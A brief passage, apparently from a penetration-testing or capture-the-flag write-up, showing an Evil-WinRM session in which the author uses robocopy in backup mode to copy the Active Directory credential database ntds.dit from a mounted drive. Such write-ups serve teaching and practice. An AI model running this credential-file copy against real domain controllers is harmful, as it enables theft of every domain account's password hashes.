@@ -1,0 +1,1 @@
+drive through. I’ll have to use robocopy to do it: *Evil-WinRM* PS C:\programdata> robocopy /b E:\Windows\ntds . ntds.dit ------------------------------------------------------------------------------- ROBOCOPY :: Robust File Copy for Windows -------------------------------------------------------------------------------
